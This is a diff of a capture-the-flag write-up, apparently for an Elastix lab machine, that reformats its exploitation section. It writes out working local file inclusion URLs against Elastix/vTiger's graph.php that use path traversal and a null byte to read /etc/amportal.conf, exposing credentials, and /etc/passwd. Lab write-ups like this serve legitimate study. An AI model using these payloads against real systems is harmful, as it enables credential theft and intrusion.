@@ -126,14 +126,22 @@ Finished
 
 ## Exploitation
 + **Elastix 2.2.0 - 'graph.php' Local File Inclusion:** [LFI](https://www.exploit-db.com/exploits/37637)
-+ exploit: `/vtigercrm/graph.php?current_language=../../../../../../../..//etc/amportal.conf%00&module=Accounts&action`
-+ Navigate to `https://10.10.10.7/vtigercrm/graph.php?current_language=../../../../../../../..//etc/amportal.conf%00&module=Accounts&action`
++ Exploit: `/vtigercrm/graph.php?current_language=../../../../../../../..//etc/amportal.conf%00&module=Accounts&action`
++ Navigate to:
+```
+https://10.10.10.7/vtigercrm/graph.php?current_language=../../../../../../../..//etc/amportal.conf%00&module=Accounts&action
+```
+
 ![image](https://github.com/h4md153v63n/CTFs/assets/5091265/87307089-e37c-4265-8c39-915ac2a57034)
 
 + Users and passwords identified:
 ![image](https://github.com/h4md153v63n/CTFs/assets/5091265/352c0043-3abf-48ff-bc04-d930166aa76f)
 
-+ And also try `view-source:https://10.10.10.7/vtigercrm/graph.php?current_language=../../../../../../../..//etc/passwd%00&module=Accounts&action`
++ And also try:
+```
+view-source:https://10.10.10.7/vtigercrm/graph.php?current_language=../../../../../../../..//etc/passwd%00&module=Accounts&action
+```
+
 ![image](https://github.com/h4md153v63n/CTFs/assets/5091265/5723c61c-8d7e-429e-862f-e94b5cbede3f)
 
 + **vTiger CRM 5.1.0 - Local File Inclusion:** [CVE-2012-4867](https://www.exploit-db.com/exploits/18770)
